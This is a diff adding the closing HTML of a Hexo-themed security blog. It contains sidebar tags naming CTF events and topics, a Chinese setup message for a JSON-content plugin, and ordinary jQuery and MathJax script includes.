+        <span class="sidebar-tag-name" data-tags="0CTF"><span class="iconfont-archer">&#xe606;</span>0CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ASIS"><span class="iconfont-archer">&#xe606;</span>ASIS</span>
+    
+        <span class="sidebar-tag-name" data-tags="RealWorldCTF"><span class="iconfont-archer">&#xe606;</span>RealWorldCTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Web"><span class="iconfont-archer">&#xe606;</span>Web</span>
+    
+        <span class="sidebar-tag-name" data-tags="CONFidence"><span class="iconfont-archer">&#xe606;</span>CONFidence</span>
+    
+        <span class="sidebar-tag-name" data-tags="Flare-On"><span class="iconfont-archer">&#xe606;</span>Flare-On</span>
+    
+        <span class="sidebar-tag-name" data-tags="Plaid"><span class="iconfont-archer">&#xe606;</span>Plaid</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pragyan"><span class="iconfont-archer">&#xe606;</span>Pragyan</span>
+    
+        <span class="sidebar-tag-name" data-tags="AFL++"><span class="iconfont-archer">&#xe606;</span>AFL++</span>
+    
+        <span class="sidebar-tag-name" data-tags="QEMU"><span class="iconfont-archer">&#xe606;</span>QEMU</span>
+    
+        <span class="sidebar-tag-name" data-tags="Balsn"><span class="iconfont-archer">&#xe606;</span>Balsn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Algorithm"><span class="iconfont-archer">&#xe606;</span>Algorithm</span>
+    
+        <span class="sidebar-tag-name" data-tags="AIS3"><span class="iconfont-archer">&#xe606;</span>AIS3</span>
+    
+        <span class="sidebar-tag-name" data-tags="Reversing-kr"><span class="iconfont-archer">&#xe606;</span>Reversing-kr</span>
+    
+        <span class="sidebar-tag-name" data-tags="Cryptography"><span class="iconfont-archer">&#xe606;</span>Cryptography</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pwn"><span class="iconfont-archer">&#xe606;</span>Pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Misc"><span class="iconfont-archer">&#xe606;</span>Misc</span>
+    
+        <span class="sidebar-tag-name" data-tags="OSCP"><span class="iconfont-archer">&#xe606;</span>OSCP</span>
+    
+        <span class="sidebar-tag-name" data-tags="OS"><span class="iconfont-archer">&#xe606;</span>OS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Base64"><span class="iconfont-archer">&#xe606;</span>Base64</span>
+    
+        <span class="sidebar-tag-name" data-tags="AVX"><span class="iconfont-archer">&#xe606;</span>AVX</span>
+    
+        <span class="sidebar-tag-name" data-tags="FaceBook"><span class="iconfont-archer">&#xe606;</span>FaceBook</span>
+    
+        <span class="sidebar-tag-name" data-tags="GIF"><span class="iconfont-archer">&#xe606;</span>GIF</span>
+    
+        <span class="sidebar-tag-name" data-tags="Windows"><span class="iconfont-archer">&#xe606;</span>Windows</span>
+    
+        <span class="sidebar-tag-name" data-tags="browser"><span class="iconfont-archer">&#xe606;</span>browser</span>
+    
+        <span class="sidebar-tag-name" data-tags="Chakra"><span class="iconfont-archer">&#xe606;</span>Chakra</span>
+    
+        <span class="sidebar-tag-name" data-tags="JIT"><span class="iconfont-archer">&#xe606;</span>JIT</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="WriteUp"><span class="iconfont-archer">&#xe60a;</span>WriteUp</span>
+    
+        <span class="sidebar-category-name" data-categories="Record"><span class="iconfont-archer">&#xe60a;</span>Record</span>
+    
+        <span class="sidebar-category-name" data-categories="Reminder"><span class="iconfont-archer">&#xe60a;</span>Reminder</span>
+    
+        <span class="sidebar-category-name" data-categories="Note"><span class="iconfont-archer">&#xe60a;</span>Note</span>
+    
+        <span class="sidebar-category-name" data-categories="TodayILearn"><span class="iconfont-archer">&#xe60a;</span>TodayILearn</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: "/",
+        author: "Terrynini"
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>
+    
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+</body>
+</html>
+
+
